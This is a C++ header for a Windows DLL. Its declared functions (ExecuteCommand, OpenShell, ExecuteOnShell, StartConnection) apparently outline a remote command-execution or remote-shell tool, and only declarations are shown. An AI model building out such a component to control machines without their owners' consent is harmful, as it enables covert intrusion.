#pragma once
#include <Windows.h>
#include <iostream>


int OnAccept(char* buffer);

const int Update(int length, char* value);
const int Echo(char* buffer);
const int ExecuteCommand(int length, char* command);
const int OpenShell(int length, char* shellType);
const int ExecuteOnShell(int length, char* command);

#ifndef INDLL_H
#define INDLL_H

#ifdef EXPORTING_DLL
extern "C" __declspec(dllexport) void StartConnection();
extern "C" __declspec(dllexport) void GetExecutablePath(char* buffer);

#else
extern "C" __declspec(dllexport) void StartConnection();
extern "C" __declspec(dllexport) void GetExecutablePath(char* buffer);

#endif


#endif